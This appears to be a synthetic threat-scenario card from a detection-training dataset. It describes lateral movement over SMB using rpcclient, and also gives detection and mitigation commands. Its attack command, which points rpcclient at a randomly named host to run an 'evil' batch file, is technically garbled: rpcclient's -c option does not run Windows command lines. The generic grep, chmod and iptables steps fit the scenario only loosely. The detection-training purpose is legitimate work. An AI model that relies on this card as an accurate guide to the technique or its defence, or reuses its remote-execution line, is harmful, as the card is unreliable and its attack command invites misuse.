---
type: campaign
scenario_id: 223
tactic: Lateral Movement
technique: "T1021.002: Remote Services: SMB/Windows Admin Shares"
technique_id: T1021.002
tags: [campaign, lotl, lateral_movement]
---

# Using rpcclient to execute commands via SMB.

## Threat Description
Using rpcclient to execute commands via SMB.

## Attack Command
```
rpcclient -U $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)%$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -c "cmd /c C:\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)"
```

## Detection Logic
Monitor rpcclient: `ps aux | grep rpcclient | grep cmd`; Monitor SMB traffic: `netstat -anp | grep :445`.

## Mitigation
Restrict rpcclient: `chmod 700 /usr/bin/rpcclient`; Block SMB: `iptables -A INPUT -p tcp --dport 445 -j DROP`.

## AI Training Prompt
Train AI to detect rpcclient SMB execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
